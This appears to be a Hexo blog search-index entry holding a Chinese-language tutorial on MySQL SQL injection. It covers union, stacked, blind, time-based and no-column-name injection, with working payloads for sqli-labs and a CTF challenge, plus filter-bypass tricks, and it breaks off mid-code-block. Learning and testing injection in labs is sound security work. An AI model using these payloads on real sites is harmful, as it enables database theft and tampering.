<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>sql注入漏洞总结</title>
      <link href="/2023/08/23/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-mysql/"/>
      <url>/2023/08/23/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-mysql/</url>
      
        <content type="html"><![CDATA[<p>沙上有印，光中有</p><hr><h1 id="SQL注入总结"><a href="#SQL注入总结" class="headerlink" title="SQL注入总结"></a>SQL注入总结</h1><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="系统函数"><a href="#系统函数" class="headerlink" title="系统函数"></a>系统函数</h3><blockquote><p>system_user()——系统用户名</p><p>user()——用户名</p><p>current_user()——当前用户名</p><p>session_user()——链接数据库的用户名</p><p>database()——数据库名</p><p>version()——数据库版本</p><p>@@datadir——数据库路径</p><p>@@basedir——数据库安装路径</p><p>@@version_conpile_os——操作系统</p></blockquote><h3 id="字符串连接函数"><a href="#字符串连接函数" class="headerlink" title="字符串连接函数"></a>字符串连接函数</h3><blockquote><p>concat(str1,str2,…)——没有分隔符地连接字符串</p><p>concat_ws(separator,str1,str2,…)——含有分隔符地连接字符串</p><p>group_concat(str1,str2,…)——连接一个组的所有字符串，并以逗号分隔每一条数据。</p></blockquote><h3 id="一般用于尝试的语句"><a href="#一般用于尝试的语句" class="headerlink" title="一般用于尝试的语句"></a>一般用于尝试的语句</h3><p>–+可以用#替换，url 提交过程中Url 编码后的#为%23</p><pre class="language-none"><code class="language-none">or 1=1--+'or 1=1--+"or 1=1--+)or 1=1--+')or 1=1--+") or 1=1--+"))or 1=1--+一般的代码为：$id=$_GET['id'];$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";</code></pre><p>此处考虑两个点，一个是闭合前面你的‘ 另一个是处理后面的‘ ，一般采用两种思路，闭合后面的引号或者注释掉，注释掉采用–+ 或者#（%23）</p><h3 id="union-操作符的介绍"><a href="#union-操作符的介绍" class="headerlink" title="union 操作符的介绍"></a>union 操作符的介绍</h3><p>联合查询是可合并多个相似的选择查询的结果集。等同于将一个表追加到另一个表，从而实现将两个表的查询组合到一起，使用谓词为UNION或UNION ALL。将多个查询的结果合并到一起（纵向合并）：字段数不变，多个查询的记录数合并。</p><p>基本语法：</p><blockquote><p>Select 语句</p><p>Union [union 选项]</p><p>Select 语句;</p><p>Union选项：与select选项基本一样</p><p>Distinct：去重，去掉完全重复的数据（默认的）</p><p>All：保存所有的结果</p></blockquote><pre class="language-none"><code class="language-none">SELECT column_name(s) FROM table_name1UNION [distinct] --默认为distinct                 --如果允许重复值就改为AllSELECT column_name(s) FROM table_name2</code></pre><p>union理论上只要保证字段数一样，不需要每次拿到的数据对应的字段类型一致。永远只保留第一个select语句对应的字段名字。</p><h3 id="sql-中的逻辑运算"><a href="#sql-中的逻辑运算" class="headerlink" title="sql 中的逻辑运算"></a>sql 中的逻辑运算</h3><pre class="language-none"><code class="language-none">Select * from users where id=1 and 1=1;</code></pre><p> 这条语句为什么能够选择出id=1的内容，and 1=1 到底起作用了没有？这里就要清楚sql 语句执行顺序了。 同时这个问题我们在使用万能密码的时候会用到。Select <em>from admin where username=’admin’ and password=’admin’我们可以用’or 1=1# 作为密码输入。原因是为什么？这里涉及到一个逻辑运算，当使用上述所谓的万能密码后，构成的sql 语句为：Select</em> from admin where username=’admin’ and password=’’or 1=1#’  Explain:上面的这个语句执行后，我们在不知道密码的情况下就登录到了admin 用户了。原因是在where 子句后， 我们可以看到三个条件语句username=’admin’ andpassword=’’or 1=1。三个条件用and 和or 进行连接。在sql 中，我们and 的运算优先级大于or 的元算优先级。因此可以看到第一个条件（用a 表示）是真的，第二个条件（用b 表示）是假的，a and b = false,第一个条件和第二个条件执行and 后是假，再与第三个条件or 运算，因为第三个条件1=1 是恒成立的，所以结果自然就为真了。因此上述的语句就是恒真了。.</p><p>①Select <em>from users where id=1 and 1=1;</em> <em>②Select</em> from users where id=1 &amp;&amp; 1=1; ③Select * from users where id=1 &amp; 1=1; 上述三者有什么区别？①和②是一样的，表达的意思是id=1 条件和1=1 条件进行与运算。 ③的意思是id=1 条件与1 进行&amp;位操作，id=1 被当作true，与1 进行&amp; 运算结果还是1，再进行=操作，1=1,还是1（ps：&amp;的优先级大于=） Ps:此处进行的位运算。我们可以将数转换为二进制再进行与、或、非、异或等运算。必要的时候可以利用该方法进行注入结果。例如将某一字符转换为ascii 码后，可以分别与1,2,4,8,16,32.。。。进行与运算，可以得到每一位的值，拼接起来就是ascii 码值。再从ascii 值反推回字符。（运用较少）</p><h3 id="order-by介绍"><a href="#order-by介绍" class="headerlink" title="order by介绍"></a>order by介绍</h3><p>在mysql中order by是用来根据校对规则对数据进行排序</p><p>基本语法：order by 字段 [asc|desc]; //asc升序，默认的</p><p>并且order by还可以多字段排序，先按照第一个字段进行排序，然后再按照第二个字段进行排序。</p><p>因此在sql注入中可以通过order by来判断表中有多少字段，并且并不需要知道字段的名字是什么，通过数字1、2、3等也可以排序，因为在mysql中字段的名字也可以用过1、2、3等来表示。</p><p>参数默认是asc，可以不用加。</p><p>当order by中的字段数为3时，由于表中字段数不足，则报错。因此可判断字段数为2.</p><h3 id="注入流程"><a href="#注入流程" class="headerlink" title="注入流程"></a>注入流程</h3><p>我们的数据库存储的数据按照上图的形式，一个数据库当中有很多的数据表，数据表当中有很多的列，每一列当中存储着数据。我们注入的过程就是先拿到数据库名，在获取到当前数据库名下的数据表，再获取当前数据表下的列，最后获取数据。</p><h3 id="系统数据库（information-schema）"><a href="#系统数据库（information-schema）" class="headerlink" title="系统数据库（information_schema）"></a>系统数据库（information_schema）</h3><p> 在mysql 5.0版本之后，mysql默认在数据库中存放一个”information_schema”的数据库，在该库中，需要记住三个表名，分别是schemata、tables、cliumns。</p><p> schemata表存储该用户创建的所有数据库的库名。</p><p>通过schemata表我们就可以猜数据库了</p><pre class="language-none"><code class="language-none">select schema_name from information_schema.schemata;</code></pre><p>tables表存储该用户创建的所有数据库的库名和表名。</p><p>通过tables表我们就可以猜某库的数据表</p><pre class="language-none"><code class="language-none">select table_name from information_schema.tables where table_schema=’xxxxx’;</code></pre><p>columns表存储该用户</p><p>通过columns表我们就可以猜某表的所有列</p><pre class="language-none"><code class="language-none">Select column_name from information_schema.columns where table_name=’xxxxx’;</code></pre><p>最后获取某列的数据</p><pre class="language-none"><code class="language-none">Select xxxx from xxxx</code></pre><p><strong>当information_schema被屏蔽时，可使用其他的表</strong></p><p>可以参考这边文章：<a href="https://www.anquanke.com/post/id/193512">https://www.anquanke.com/post/id/193512</a></p><p><strong>innodb表</strong></p><p>MySQL 5.6 及以上版本存在<code>innodb_index_stats</code>，<code>innodb_table_stats</code>两张表，其中包含新建立的库和表</p><pre class="language-none"><code class="language-none">select table_name from mysql.innodb_table_stats where database_name = database(); select table_name from mysql.innodb_index_stats where database_name = database();</code></pre><p><strong>sys表</strong></p><p>在MySQL 5.7.9中sys中新增了一些视图，可以从中获取表名</p><pre class="language-none"><code class="language-none">#包含inSELECT object_name FROM `sys`.`x$innodb_buffer_stats_by_table` where object_schema = database();SELECT object_name FROM `sys`.`innodb_buffer_stats_by_table` WHERE object_schema = DATABASE();SELECT TABLE_NAME FROM `sys`.`x$schema_index_statistics` WHERE TABLE_SCHEMA = DATABASE();SELECT TABLE_NAME FROM `sys`.`schema_auto_increment_columns` WHERE TABLE_SCHEMA = DATABASE();SELECT table_schema FROM sys.schema_table_statistics GROUP BY table_schema;#不包含inSELECT TABLE_NAME FROM `sys`.`x$schema_flattened_keys` WHERE TABLE_SCHEMA = DATABASE();SELECT TABLE_NAME FROM `sys`.`x$ps_schema_table_statistics_io` WHERE TABLE_SCHEMA = DATABASE();SELECT TABLE_NAME FROM `sys`.`x$schema_table_statistics_with_buffer` WHERE TABLE_SCHEMA = DATABASE();SELECT table_schema FROM sys.x$schema_flattened_keys GROUP BY table_schema;#通过表文件的存储路径获取表名SELECT FILE FROM `sys`.`io_global_by_file_by_bytes` WHERE FILE REGEXP DATABASE();SELECT FILE FROM `sys`.`io_global_by_file_by_latency` WHERE FILE REGEXP DATABASE();SELECT FILE FROM `sys`.`x$io_global_by_file_by_bytes` WHERE FILE REGEXP DATABASE();#查询指定库的表（若无则说明此表从未被访问）SELECT table_name FROM sys.schema_table_statistics WHERE table_schema='mspwd' GROUP BY table_name;SELECT table_name FROM sys.x$schema_flattened_keys WHERE table_schema='mspwd' GROUP BY table_name;#统计所有访问过的表次数:库名,表名,访问次数select table_schema,table_name,sum(io_read_requests+io_write_requests) io from sys.schema_table_statistics group bytable_schema,table_name order by io desc;#查看所有正在连接的用户详细信息SELECT user,db,command,current_statement,last_statement,time FROM sys.session;#查看所有曾连接数据库的IP,总连接次数SELECT host,total_connections FROM sys.host_summary;</code></pre><p>包含之前查询记录的表</p><pre class="language-none"><code class="language-none">SELECT QUERY FROM sys.x$statement_analysis WHERE QUERY REGEXP DATABASE();SELECT QUERY FROM `sys`.`statement_analysis` where QUERY REGEXP DATABASE();</code></pre><p>performance_schema表</p><pre class="language-none"><code class="language-none">SELECT object_name FROM `performance_schema`.`objects_summary_global_by_type` WHERE object_schema = DATABASE();SELECT object_name FROM `performance_schema`.`table_handles` WHERE object_schema = DATABASE();SELECT object_name FROM `performance_schema`.`table_io_waits_summary_by_index_usage` WHERE object_schema = DATABASE();SELECT object_name FROM `performance_schema`.`table_io_waits_summary_by_table` WHERE object_schema = DATABASE();SELECT object_name FROM `performance_schema`.`table_lock_waits_summary_by_table` WHERE object_schema = DATABASE();</code></pre><p>包含之前查询记录的表</p><pre class="language-none"><code class="language-none">SELECT digest_text FROM `performance_schema`.`events_statements_summary_by_digest` WHERE digest_text REGEXP DATABASE();</code></pre><p>包含表文件路径的表</p><pre class="language-none"><code class="language-none">SELECT file_name FROM `performance_schema`.`file_instances` WHERE file_name REGEXP DATABASE();</code></pre><p>表格 还在加载中，请等待加载完成后再尝试复制</p><p>上诉表格中虽然有能够查列名的表，但是查出来的数据都不全，当知道<code>flag</code>所在的库和表名时，但无法获取到列名，就需要利用<strong>无列名盲注了</strong></p><h2 id="select被过滤"><a href="#select被过滤" class="headerlink" title="select被过滤"></a>select被过滤</h2><pre class="language-none"><code class="language-none">mysql 8.0.19`新增语句`tableTABLE table_name [ORDER BY column_name] [LIMIT number [OFFSET number]]</code></pre><p>可以把<code>table t</code>简单理解成<code>select * from t</code>，和<code>select</code>的区别在于</p><ul><li><code>table</code>总是显示表的所有列</li><li><code>table</code>不允许任何的行过滤;也就是说，<code>TABLE</code>不支持任何<code>WHERE</code>子句。 可以用来盲注表名</li></ul><pre class="language-none"><code class="language-none">admin'and\x0a(table\x0ainformation_schema.TABLESPACES_EXTENSIONS\x0alimit\x0a7,1)&gt;(BINARY('{}'),'0')#</code></pre><p>同时代替<code>select</code>被过滤导致只能同表查询的问题</p><p>PS：新增的<code>values</code>语句也挺有意思，在某些情况似乎可以代替<code>union</code>或<code>select</code>进行<code>order by</code>盲注</p><h2 id="联合查询的类型"><a href="#联合查询的类型" class="headerlink" title="联合查询的类型"></a>联合查询的类型</h2><p>union 联合注入，union 的作用是将两个sql 语句进行联合。Union 可以从下面的例子中可以看出，强调一点：union 前后的两个sql 语句的选择列数要相同才可以。Union all 与union 的区别是增加了去重的功能。</p><p>并且运用information_schema的知识。</p><p>sql-labs/less-1</p><p>字符型报错</p><pre class="language-none"><code class="language-none">//order by判断字段http://127.0.0.1/sqli-labs/Less-1/?id=-1' or 1=1 order by 3 --+//通过union select判断显示的是哪些字段http://127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,2,3 --+//通过information_schema爆数据库http://127.0.0.1/sqli-labs/Less-1/?id=-1'  union select 1,database(),group_concat(schema_name) from information_schema.schemata --+//爆数据表</code></pre><p>admin’or(updatexml(1,concat(version()),1)or’1’like’1</p><p>select(group_concat(table_name)from(infromation_schema.table)where(table_schema)like(‘geek’))</p><p>select(group_concat(table_name)from(information_schema.tables)where(table_schema)like(‘geek’))</p><p>sql-labs/less-2</p><p>整数报错</p><p>与less-1差不多 将’去除即可</p><p>sql-labs/less-3</p><p>可以成功注入的有：</p><blockquote><p>‘) or ‘1’=(‘1’ ) or 1=1 –+</p></blockquote><p>将less1 中的’ 添加）即可 ‘）</p><p>sql-labs/less-4</p><p>可以成功注入的有：</p><blockquote><p>“) or ”1”=(“1 “) or 1=1 –+</p></blockquote><p>将less1 中的‘ 更换为“)</p><p>sql-labs/less-5</p><h2 id="堆查询注射"><a href="#堆查询注射" class="headerlink" title="堆查询注射"></a>堆查询注射</h2><p>堆叠注入。从名词的含义就可以看到应该是一堆sql 语句（多条）一起执行。而在真实的运用中也是这样的，我们知道在mysql 中，主要是命令行中，每一条语句结尾加; 表示语句结束。这样我们就想到了是不是可以多句一起使用。这个叫做stacked injection。</p><h3 id="原理介绍"><a href="#原理介绍" class="headerlink" title="原理介绍"></a>原理介绍</h3><p>在SQL 中，分号（;）是用来表示一条sql 语句的结束。试想一下我们在; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而unioninjection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union或者union all 执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。</p><p>例如以下这个例子。</p><p>当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</p><h3 id="堆叠注入的局限性"><a href="#堆叠注入的局限性" class="headerlink" title="堆叠注入的局限性"></a>堆叠注入的局限性</h3><p>堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到API 或者数据库引擎不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。</p><p>虽然我们前面提到了堆叠查询可以执行任意的sql 语句，但是这种注入方式并不是十分的完美的。在我们的web 系统中，因为代码通常只返回一个查询结果，因此，堆叠注入第二个语句产生错误或者结果只能被忽略，我们在前端界面是无法看到返回结果的。因此，在读取数据时，我们建议使用union（联合）注入。同时在使用堆叠注入之前，我们也是需要知道一些数据库相关信息的，例如表名，列名等信息。可考虑使用RENAME关键字，将想要的数据列名/表名更改成返回数据的SQL语句所定义的表/列名。</p><pre class="language-none"><code class="language-none">以PHP为例，使用的条件为$mysqli-&gt;multi_query($sql);</code></pre><p>使用堆叠注入时，可使用的方法：</p><p>当过滤<code>select</code>时，可使用<code>handler</code>语句。<code>handler</code>语句并不具备<code>select</code>语句的所有功能。它是<code>mysql</code>专用的语句，并没有包含到<code>SQL</code>标准中</p><pre class="language-none"><code class="language-none">handler users open as hd; #指定数据表进行载入并将返回句柄重命名handler hd read first; #读取指定表/句柄的首行数据handler hd read next; #读取指定表/句柄的下一行数据handler hd close; #关闭句柄</code></pre><p>预处理：</p><pre class="language-none"><code class="language-none">prepare xxx from "sql语句";execute xxx;由于sql语句是字符串，因此可以使用操作字符串的函数，绕过一些过滤比如过滤了selectPREPARE st from concat('s','elect', ' * from `1919810931114514`');EXECUTE st;#</code></pre><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><h4 id="强网杯随便注"><a href="#强网杯随便注" class="headerlink" title="强网杯随便注"></a>强网杯随便注</h4><pre class="language-none"><code class="language-none">1';show tables;#  看有什么表在里面1';show columns from `1919810931114514`;#  看列1';show columns from `words`;# 可以发现这个表是可以回显内容的我们可以用函数将1919810931114514表改成words表，来让他自动回显RENAME TABLE `words` TO `words1`;RENAME TABLE `1919810931114514` TO `words`;ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;#将新words表的flag改为id避免开始无法查询接下来还有预处理语句使用方法PREPARE name from '[my sql sequece]';   //预定义SQL语句EXECUTE name;  //执行预定义SQL语句(DEALLOCATE || DROP) PREPARE name;  //删除预定义SQL语句SET @tn = 'hahaha';  //存储表名SET @sql = concat('select * from ', @tn);  //存储SQL语句PREPARE name from @sql;   //预定义SQL语句EXECUTE name;  //执行预定义SQL语句(DEALLOCATE || DROP) PREPARE sqla;  //删除预定义SQL语句由于过滤了select可以用chr()最后payload:最终payload1';PREPARE jwt from concat(char(115,101,108,101,99,116), ' * from `1919810931114514` ');EXECUTE jwt;#1';HANDLER FlagHere OPEN;HANDLER FlagHere READ FIRST;HANDLER FlagHere CLOSE;#</code></pre><h2 id="无列名盲注"><a href="#无列名盲注" class="headerlink" title="无列名盲注"></a>无列名盲注</h2><p>当我们无法获取字段时，比如information_schema被过滤，可使用无列名注入</p><h3 id="使用union-select重命名法"><a href="#使用union-select重命名法" class="headerlink" title="使用union select重命名法"></a>使用<code>union select重命名法</code></h3><pre class="language-none"><code class="language-none">mysql&gt; select * from users;+----+----------+------------+| id | username | password   |+----+----------+------------+|  1 | Dumb     | Dumb       ||  2 | Angelina | I-kill-you |+----+----------+------------+2 rows in set (0.00 sec)mysql&gt; select 1,2,3 union select * from users;+----+----------+------------+| 1  | 2        | 3          |+----+----------+------------+|  1 | 2        | 3          ||  1 | Dumb     | Dumb       ||  2 | Angelina | I-kill-you |+----+----------+------------+3 rows in set (0.00 sec)#对比可以发现使用union时，列名被替换为前面的select的列名了，为1，2，3。mysql&gt; select a.1 from (select 1,2,3 union select * from users) a;+---+| 1 |+---+| 1 || 1 || 2 |+---+3 rows in set (0.00 sec)#将前面生成的表重命名为a，再使用select a.1，查询第一列的值#可以看到，使用union查询，在不知道列名的情况下，依然能够将列注入出来，通过1，2，3选择第几列</code></pre><pre class="language-none"><code class="language-none">select c from (select 1 as a, 1 as b, 1 as c union select * from test)x limit 1 offset 1;select a.`3` from(select 1,2,3 union select * from admin)a limit 1,1;//无逗号，有join版本select a from (select * from (select 1 `a`)m join (select 2 `b`)n join (select 3 `c`)t where 0 union select * from test)x;</code></pre><h3 id="比较法"><a href="#比较法" class="headerlink" title="比较法"></a>比较法</h3><pre class="language-none"><code class="language-none">mysql&gt; select 'b' &lt; 'azzzzz';+----------------+| 'b' &lt; 'azzzzz' |+----------------+|              0 |+----------------+1 row in set (0.00 sec)mysql&gt; select 'ab' &lt; 'azzzzz'    -&gt; ;+-----------------+| 'ab' &lt; 'azzzzz' |+-----------------+|               1 |+-----------------+1 row in set (0.00 sec)#mysql比较，从第一个字符还是比较ascii的大小，一次往后#并且多列的比较时从第一列的第一位开始的mysql&gt; select (select 1,'Dumb','a')&gt; (select * from users limit 1);+------------------------------------------------------+| (select 1,'Dumb','a')&gt; (select * from users limit 1) |+------------------------------------------------------+|                                                    0 |+------------------------------------------------------+1 row in set (0.00 sec)mysql&gt; select (select 1,'Dumb','b') &gt; (select * from users limit 1);+-------------------------------------------------------+| (select 1,'Dumb','b') &gt; (select * from users limit 1) |+-------------------------------------------------------+|                                                     0 |+-------------------------------------------------------+1 row in set (0.00 sec)mysql&gt; select (select 1,'Dumb','D') &gt; (select * from users limit 1);+-------------------------------------------------------+| (select 1,'Dumb','D') &gt; (select * from users limit 1) |+-------------------------------------------------------+|                                                     0 |+-------------------------------------------------------+1 row in set (0.00 sec)mysql&gt; select (select 1,'Dumb','F') &gt; (select * from users limit 1);+-------------------------------------------------------+| (select 1,'Dumb','F') &gt; (select * from users limit 1) |+-------------------------------------------------------+|                                                     1 |+-------------------------------------------------------+1 row in set (0.00 sec)#通过比较可以将三列的数据全部盲注出来</code></pre><pre class="language-none"><code class="language-none">((SELECT 1,concat('{result+chr(mid)}', cast("0" as JSON)))&lt;(SELECT * FROM `f1ag_1s_h3r3_hhhhh`))</code></pre><p>要求后面select的结果必须是一行，可以通过limit限制一行。mysql中对char型大小写是不敏感的，盲注的时候要么可以使用<code>hex</code>或者<code>binary</code>。</p><h2 id="SQL-盲注"><a href="#SQL-盲注" class="headerlink" title="SQL 盲注"></a>SQL 盲注</h2><p>何为盲注？盲注就是在sql 注入过程中，sql 语句执行的选择后，选择的数据不能回显到前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。</p><h3 id="基于布尔SQL-盲注"><a href="#基于布尔SQL-盲注" class="headerlink" title="基于布尔SQL 盲注"></a>基于布尔SQL 盲注</h3><h4 id="Sql注入截取字符串常用函数"><a href="#Sql注入截取字符串常用函数" class="headerlink" title="Sql注入截取字符串常用函数"></a>Sql注入截取字符串常用函数</h4><p>在sql注入中，往往会用到截取字符串的问题，例如不回显的情况下进行的注入，也成为盲注，这种情况下往往需要一个一个字符的去猜解，过程中需要用到截取字符串。</p><p><strong>mid()</strong></p><blockquote><p>mid(s,n,len);</p><p>从字符串 s 的 n 位置截取长度为 len 的子字符串</p></blockquote><pre class="language-none"><code class="language-none">SELECT MID("RUNOOB", 2, 3) AS ExtractString; -- UNO</code></pre><p><strong>substr()/substring()</strong></p><blockquote><p>substr(s, start, length);</p><p>substring(s, start, length)</p><p>从字符串 s 的 start 位置截取长度为 length 的子字符串</p></blockquote><pre class="language-none"><code class="language-none">SELECT MID("RUNOOB", 2, 3) AS ExtractString; -- UNO                                </code></pre><p><strong>left()</strong></p><blockquote><p>left(s,n);</p><p>返回字符串 s 的前 n 个字符</p></blockquote><pre class="language-none"><code class="language-none">SELECT LEFT('runoob',2);-- ru</code></pre><p><strong>right()</strong></p><blockquote><p>right(s,n);</p><p>返回字符串 s 的后 n 个字符</p></blockquote><pre class="language-none"><code class="language-none">SELECT right('runoob',2);-- ob</code></pre><p><strong>ascii()/ord()</strong></p><blockquote><p>ascii(s);/ord(s);</p><p>返回字符串 s 的第一个字符的 ASCII 码。</p><p>这里不考虑多字节字符，比如汉字</p></blockquote><p><strong>trim()/rtrim()/ltrim()</strong></p><blockquote><p>ltrim(s);</p><p>去掉字符串s开始处的空格</p><p>rtrim(s);</p><p>去掉字符串s结尾处的空格</p><p>trim(s);</p><p>去掉字符串开始和结尾处的空格</p></blockquote><pre class="language-none"><code class="language-none">SELECT TRIM('    RUNOOB    ') AS TrimmedString;-- RUNOOBSELECT RTRIM("RUNOOB     ") AS RightTrimmedString;   -- RUNOOBSELECT LTRIM("    RUNOOB") AS LeftTrimmedString;-- RUNOOB</code></pre><p>这个怎么用来截取字符串呢？</p><pre class="language-none"><code class="language-none">TRIM([BOTH/LEADING/TRAILING] 目标字符串 FROM 源字符串）BOTH删除两边的指定字符串LEADING删除左边的指定字符串TARILING删除右边的指定字符串select trim(LEADING "a" from "abcd") = trim(LEADING "b" from "abcd");以这个为例，我们将删除的字符串ASCII差限制在1，例如a和b当这个结果返回0时，则第一个字符是a或者b。接着让a的ASCII+2变成c，如果返回1，则字符串第一位为a，反之第一位为b。这样做的目的是为了方便写脚本第二个字符判断select trim(LEADING "aa" from "abcd") = trim(LEADING "ab" from "abcd");接着重复上面的过程，判断第二个字符以此推出整个字符串如果=用regexp替代那么正确的字符一定在regexp前面以这个abcd为例Trim(leading ‘a’ from ‘abcd’) regexp trim(LEADING ‘x’ from ‘abcd’)就是bcd regexp abcd返回0， 如果反过来就是abcd regexp bcd 返回1因此只需判断第一步即可，而不需要ASCII+2去判断了注：y1ng师傅在[HFCTF 2021 Final]hatenum中用到了这个方法，通过持续递归，多次套娃trim。如果字符串长度被限制，可使用。一次只截断几个字符例如：select trim(LEADING "b" from trim(LEADING "a" from "abcd"));-- cd先截断a，返回字符串bcd，在截断b，返回字符串cd</code></pre><p><strong>注：可以看到这个函数可以不使用</strong>**,<strong><strong>的，如果</strong></strong>,**<strong>被过滤可以使用</strong></p><p><strong>INSERT()</strong></p><blockquote><p>INSERT(s1,x,len,s2)</p><p>字符串 s2 替换 s1 的 x 位置开始长度为 len 的字符串</p></blockquote><pre class="language-none"><code class="language-none">SELECT INSERT("google.com", 1, 6, "runoob");  -- 输出：runoob.comSELECT INSERT("google.com", 1,2, "runoob");-- 输出：runoobogle.com如何使用呢？第一步删除起始的前x位第二步套娃删除x+1位以后的所有根据这两步我们就能取出字符串的任意位置的字符，也就相当于字符串的截取例子：第一步删除起始的前x位SELECT INSERT("abcdef", 1,0, "");-- 输出：abcdefSELECT INSERT("abcdef", 1,1, "");-- 输出：bcdef第二步套娃删除x+1位以后的所有SELECT INSERT((INSERT("abcdef", 1,0, "")),2,9999,"");-- 输出：aSELECT INSERT((INSERT("abcdef", 1,1, "")),2,9999,"");-- 输出：b可以看到我们只要改变中间的数字，就可以输出任意位置的字符</code></pre><p><strong>注：TRIM和INSERT函数比较特别，基本上是不会被过滤了，如果常用的截取函数不能用时，可选择这两个函数</strong></p><p><strong>if/case</strong></p><p>用在select查询当中，当做一种条件来进行判断</p><p>基本语法：if(条件,为真结果,为假结果)</p><p><strong>case基本语法</strong></p><pre class="language-none"><code class="language-none">MySQL 的 case when 的语法有两种：简单函数 CASE [col_name] WHEN [value1] THEN [result1]…ELSE [default] END搜索函数 CASE WHEN [expr] THEN [result1]…ELSE [default] ENDselect case 'a' when 'a' then 1 else 0 end;-- 1select case when 98&gt;12 then 1 else 0 end;</code></pre><p><strong>注：可以看出case的用法与if类似，当if被过滤或者</strong>**,**<strong>被过滤可以替换为case，并且在时间盲注中，条件语句非常有用！</strong></p><h4 id="regexp-rlike-正则表达式注入"><a href="#regexp-rlike-正则表达式注入" class="headerlink" title="regexp/rlike 正则表达式注入"></a><strong>regexp/rlike 正则表达式注入</strong></h4><p>用法介绍：select user() regexp ‘^[a-z]’; Explain：正则表达式的用法，user()结果为root，regexp 为匹配root 的正则表达式。 第二位可以用select user() regexp ‘^ro’来进行。</p><p>结果返回0或者1.</p><p><strong>示例介绍：</strong></p><pre class="language-none"><code class="language-none">select * from users where id=1 and 1=(if((user() regexp '^r'),1,0));select * from users where id=1 and 1=(user() regexp'^ri');</code></pre><p>通过if 语句的条件判断，返回一些条件句，比如if 等构造一个判断。根据返回结果是否等于0 或者1 进行判断。</p><pre class="language-none"><code class="language-none">select * from users where id=1 and 1=(select 1 from information_schema.tableswhere table_schema='security' and table_name regexp '^us[a-z]' limit 0,1);</code></pre><p>这里利用select 构造了一个判断语句。我们只需要更换regexp 表达式即可</p><p>‘^u[a-z]’ -&gt; ‘^us[a-z]’ -&gt; ‘^use[a-z]’ -&gt; ‘^user[a-z]’ -&gt; FALSE</p><p>如何知道匹配结束了？这里大部分根据一般的命名方式（经验）就可以判断。但是如何你在无法判断的情况下，可以用table_name regexp ‘^username$’来进行判断。^是从开头进行匹配，$是从结尾开始判断。更多的语法可以参考mysql 使用手册进行了解。</p><p>但是这种做法是错误的，limit 作用在前面的select 语句中，而不是regexp。那我们该如何选择。其实在regexp 中我们是取匹配table_name 中的内容，只要table_name 中有的内容，我们用regexp 都能够匹配到。因此上述语句不仅仅可以选择user，还可以匹配其他项。</p><p><strong>注：</strong><code>regexp是不区分大小写的，需要大小写敏感需要加上binary关键字</code></p><pre class="language-none"><code class="language-none">select binary database() regexp "^CTF";</code></pre><h4 id="like-匹配注入"><a href="#like-匹配注入" class="headerlink" title="like 匹配注入"></a><strong>like 匹配注入</strong></h4><p>和上述的正则类似，mysql 在匹配的时候我们可以用like 进行匹配S。</p><p>这里可以用于过滤<code>=</code>使用</p><p>用法：select user() like ‘ro%’</p><h3 id="基于时间的SQL-盲注延时注入"><a href="#基于时间的SQL-盲注延时注入" class="headerlink" title="基于时间的SQL 盲注延时注入"></a>基于时间的SQL 盲注延时注入</h3><pre class="language-none"><code class="language-none">If(ascii(substr(database(),1,1))&gt;115,0,sleep(5))%23--if 判断语句，条件为假，执行sleep</code></pre><p>Ps：遇到以下这种利用sleep()延时注入语句</p><pre class="language-none"><code class="language-none">select sleep(find_in_set(mid(@@version, 1, 1), '0,1,2,3,4,5,6,7,8,9,.'));</code></pre><p>该语句意思是在0-9 之间找版本号的第一位。但是在我们实际渗透过程中，这种用法是不可取的，因为时间会有网速等其他因素的影响，所以会影响结果的判断。</p><p><strong>benchmark</strong></p><p>MySQL有一个内置的BENCHMARK()函数，可以测试某些特定操作的执行速度。参数可以是需要执行的次数和表达式。表达式可以是任何的标量表达式，比如返回值是标量的子查询或者函数。该函数可以很方便地测试某些特定操作的性能，比如通过测试可以发现，MD5()函数比SHAI()函数要快</p><pre class="language-none"><code class="language-none">select benchmark(1000000,sha1(sha1(sha1(sha1("1")))));</code></pre><pre class="language-none"><code class="language-none">UNION SELECT IF(SUBSTRING(current,1,1)=CHAR(119),BENCHMARK(5000000,ENCODE(‘MSG’,’by 5 seconds’)),null) FROM (select database() as current) as tb1;</code></pre><p><strong>笛卡儿积</strong></p><p>这种方法又叫做heavy query，可以通过选定一个大表来做笛卡儿积，但这种方式执行时间会几何倍数的提升，在站比较大的情况下会造成几何倍数的效果，实际利用起来非常不好用。</p><p>1.<code>count()</code>函数是用来统计表中记录的一个函数，返回匹配条件的行数。 2.<code>count()</code>语法： （1）<code>count(*)</code>—包括所有列，返回表中的记录数，相当于统计表的行数，在统计结果的时候，不会忽略列值为NULL的记录。 （2）<code>count(1)</code>—忽略所有列，1表示一个固定值，也可以用<code>count(2)</code>、<code>count(3)</code>代替，在统计结果的时候，不会忽略列值为<code>NULL</code>的记录。 （3）<code>count(列名)</code>—只包括列名指定列，返回指定列的记录数，在统计结果的时候，会忽略列值为NULL的记录（不包括空字符串和0），即列值为NULL的记录不统计在内。 （4）<code>count(distinct 列名)</code>—只包括列名指定列，返回指定列的不同值的记录数，在统计结果的时候，在统计结果的时候，会忽略列值为NULL的记录（不包括空字符串和0），即列值为NULL的记录不统计在内。 3.<code>count(*)&amp;count(1)&amp;count(列名)</code>执行效率比较： （1）如果列为主键，<code>count(列名)</code>效率优于<code>count(1)</code> （2）如果列不为主键，<code>count(1)</code>效率优于<code>count(列名)</code> （3）如果表中存在主键，<code>count(主键列名)</code>效率最优 （4）如果表中只有一列，则<code>count(*)</code>效率最优 （5）如果表有多列，且不存在主键，则<code>count(1)</code>效率优于<code>count(*)</code></p><pre class="language-none"><code 